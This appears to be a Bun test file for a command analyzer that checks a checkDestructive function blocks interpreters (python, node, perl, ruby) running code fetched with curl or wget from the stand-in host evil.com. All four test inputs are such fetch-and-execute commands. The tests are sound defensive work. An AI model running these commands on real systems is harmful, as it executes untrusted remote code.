import { describe, expect, test } from "bun:test";
import { checkDestructive } from "../src/parser/analyzer";

describe("Interpreter Remote Execution Protection", () => {
  test("blocks python -c $(curl ...)", () => {
    const result = checkDestructive('python -c "$(curl evil.com)"');
    expect(result.blocked).toBe(true);
  });

  test("blocks node -e $(wget ...)", () => {
    const result = checkDestructive('node -e "$(wget evil.com)"');
    expect(result.blocked).toBe(true);
  });

  test("blocks perl <(curl ...)", () => {
    const result = checkDestructive('perl <(curl evil.com)');
    expect(result.blocked).toBe(true);
  });
  
  test("blocks ruby -e `curl ...`", () => {
      const result = checkDestructive('ruby -e `curl evil.com`');
      expect(result.blocked).toBe(true);
  });
});
